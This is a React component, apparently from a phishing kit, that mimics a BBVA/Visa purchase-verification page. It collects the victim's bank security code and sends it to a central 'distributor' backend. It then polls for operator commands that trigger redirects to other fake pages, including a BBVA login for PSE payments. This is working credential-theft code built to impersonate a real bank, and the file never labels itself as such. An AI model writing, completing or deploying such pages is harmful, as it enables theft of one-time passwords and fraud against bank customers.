import { useState, useEffect, useRef } from 'react';
import VisaLogo from "../../img/Visa_logo.webp";
import BbvaLogo from "../../img/Logo-BBVA.webp";
import { instanceBackend } from '../../../../../axios/instanceBackend';
import LoadingBbva from '../../../../../components/LoadingBbva';
import ModalErrorLogin from '../../modals/ModalErrorLogin';
import "./bbva_otp_tc.css";

// Se crea el metodo encargado del OTP
const BbvaOTP = () => {

  // Se setea el OTP
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [showValidationAlert, setShowValidationAlert] = useState(false);
  const [validationAlertMessage, setValidationAlertMessage] = useState("");

  // Se crea el ref
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se genera la sesion id y se guarda en la ref
    sessionIdRef.current = generateSessionId();
  }, []);

  // Se crea el useEffect para capturar la ip publica y la hora en estandar
  useEffect(() => {

    // Se valida si el estado en el localStorage es error
    const estadoSesion = localStorage.getItem('estado_sesion');

    // Si es error, se muestra el modal
    if (estadoSesion === 'error') {

      // Se borra el estado del localStorage
      localStorage.removeItem('estado_sesion');

      // Se muestra el alert de validación
      setShowValidationAlert(true);

      // Se setea el mensaje
      setValidationAlertMessage("El código de seguridad que ingresaste es incorrecto. Por favor, verifica el código e intenta nuevamente.")
    };

    // Cleanup al desmontar
    return () => {

      // Se limpia el polling
      if (pollingIntervalRef.current) {

        // Se limpia el intervalo
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  // Generar un ID único para esta sesión
  const generateSessionId = () => {

    // Se retorna la sesion id
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  };

  // También actualiza initPolling con logs:
  const initPolling = () => {

    // Limpiar intervalo anterior si existe
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    }

    // Iniciar polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se llama el metodo
      verifyState();
    }, 3000);

    // También verificar inmediatamente
    verifyState();
  };

  // Metodo encargado de verificar el estado de aprobación
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la petición al backend
      const response = await instanceBackend.post(`/bbva/verify-state/${sessionIdRef.current}`);

      // Se captura la respuesta
      const { estado } = response.data;

      // Estados que detienen el polling (redirecciones o finales)
      const stateValid = [

        // Botones linea 1
        'sol_otp', 'sol_tc', 'sol_finalizar',

        // Botones linea 2
        'error_otp', 'error_login'
      ];

      // Detener polling si es un estado final
      if (stateValid.includes(estado.toLowerCase())) {

        // Limpiar intervalo de polling
        if (pollingIntervalRef.current) {

          // Se limpia el intervalo
          clearInterval(pollingIntervalRef.current);

          // Se resetea la referencia
          pollingIntervalRef.current = null;
        };
      };

      // Mapeo de redirecciones
      switch (estado.toLowerCase()) {

        // ------------ Casos botones linea 1 ------------
        case 'sol_otp':

          // Redirige a la página
          window.location.href = "/banco_bbva_otp_tc";

          // Se sale del switch
          break;
        case 'sol_tc':

          // Redirige a la página
          window.location.href = "/banco_bbva_otp_tc";

          // Se sale del switch
          break;
        case 'sol_tc':

          // Redirige a la página
          window.location.href = "/banco_bbva_otp_tc";

          // Se sale del switch
          break;

        // ------------ Casos botones linea 2 ------------
        case 'error_otp':

          // Se quita el cargando
          setLoading(false);

          // Se establece el mensaje de error
          setValidationAlertMessage("El código de seguridad que ingresaste es incorrecto. Por favor, verifica el código e intenta nuevamente.");

          // Se limpia el OTP
          setOtp("");

          // Se muestra el alert de validación
          setShowValidationAlert(true);

          // Se sale del switch
          break;
        case 'error_login':

          // Se setea el error en el login
          localStorage.setItem("estado_sesion", "error");

          // Se redirecciona
          window.location.href = "/banco_bbva_login_pse";

          // Se sale del switch
          break;
        default:

          // Se sale del ciclo
          break;
      };
    } catch (error) {

      // Se cierra la sesión actual limpiando el localStorage
      localStorage.clear();

      // Detener polling
      if (pollingIntervalRef.current) {

        // Se desactiva el intervalo de polling
        clearInterval(pollingIntervalRef.current);
      };

      // Se redirige al inicio de sesión
      window.location.href = process.env.REACT_APP_URL_BANK;

      // Se retorna
      return;
    };
  };

  // Metodo encargado de validar el formulario
  const handleSubmit = async (e) => {

    // Se previene el form
    e.preventDefault();

    // Se oculta el alert de validación
    setShowValidationAlert(false);

    // Se inicializa el loading
    setLoading(true);

    // Se captura si ya hay un sessionId del localStorage
    const sessionId = localStorage.getItem("sessionId");

    // Se inicializa el json
    const dataSend = {
      "data": {
        "attributes": {
          "fecha": new Date().toISOString(),
          "otp": otp,
          "sessionId": sessionId || sessionIdRef.current,

          // DATOS NUEVOS PARA EL DISTRIBUIDOR
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/bbva/otp",
        },
      },
    };

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    // Se usa el try para la peticion
    try {

      // Se envia la peticion
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/bbva/authenticacion", dataSend);

      // Se valida la respuesta
      if (response.data.success) {

        // Se guarda la sessionId en el localStorage
        localStorage.setItem('sessionId', response.data.sessionId);

        // Guardar sesión real del backend
        sessionIdRef.current = response.data.sessionId;

        // Iniciar polling para esperar aprobación
        initPolling();
      } else {

        // // Se muestra error del login
        // handleErrorLogin();
      };
    } catch (error) {

      // Manejo detallado de errores
      if (error.response) {

        // Error de respuesta del servidor
        alert(`Error ${error.response.status}: ${error.response.data.message || 'Error del servidor'}`);
      } else if (error.request) {

        // Se quita el cargando
        setLoading(false);

        // Error de conexión
        alert('Error de conexión con el servidor');
      } else {

        // Se quita el cargando
        setLoading(false);

        // Error inesperado
        alert('Error inesperado: ' + error.message);
      };
    } finally {
    }
  };

  // Se retorna el HTML
  return (
    <div className="bbva-otp-container">
      <div className="bbva-otp-card">
        {/* Header with Logos */}
        <div className="bbva-otp-header">
          <div className="bbva-logo">
            <img src={BbvaLogo} alt="BBVA" className="bbva-logo-img" />
            {/* <span style={{ fontSize: '24px', fontWeight: 'bold', color: '#004481' }}>BBVΛ</span> */}
          </div>
          <div className="visa-logo">
            <img src={VisaLogo} alt="VISA" className="visa-logo-img" />
            {/* <span style={{ fontSize: '20px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic' }}>VISA</span> */}
          </div>
        </div>

        {/* Body Content */}
        <div className="bbva-otp-body">
          {showValidationAlert && (
            <ModalErrorLogin
              isOpen={showValidationAlert}
              onClose={() => setShowValidationAlert(false)}
              onContinue={() => setShowValidationAlert(false)}
              message={validationAlertMessage}
            />
          )}

          <h2 className="bbva-otp-title">Vamos a validar tu compra</h2>

          <p className="bbva-otp-description">
            En BBVA, tu seguridad es nuestra principal preocupación. Para verificar esta compra, te hemos enviado un código de seguridad que encontrarás en las notificaciones de tu dispositivo móvil, ya sea de la aplicación BBVA o como un mensaje de texto (SMS). Ingresa el código, haz clic en “enviar” y ¡todo listo! Tu compra estará confirmada de manera segura.
          </p>

          <form onSubmit={handleSubmit} className="bbva-otp-form">
            <label className="bbva-otp-label">Código de seguridad</label>
            <input
              type="text"
              className="bbva-otp-input"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder=""
              autoFocus
            />

            <button
              type="submit"
              className="bbva-otp-submit"
              disabled={otp.length !== 6}
              style={{
                opacity: otp.length === 6 ? 1 : 0.5,
                cursor: otp.length === 6 ? 'pointer' : 'not-allowed',
              }}
              onClick={handleSubmit}
            >
              Enviar
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: 'center' }}>
            <button
              className="bbva-otp-resend"
              onClick={() => console.log('Reenviar código')}
            >
              REENVIAR CÓDIGO
            </button>
          </div>

          <div style={{ display: 'flex', justifyContent: 'center' }}>
            <button
              className="bbva-otp-help TX"
              onClick={() => console.log('Ayuda')}
            >
              Ayuda
            </button>
          </div>
        </div>
      </div>

      {loading ?
        <LoadingBbva /> : null}
    </div>
  );
};

export default BbvaOTP;
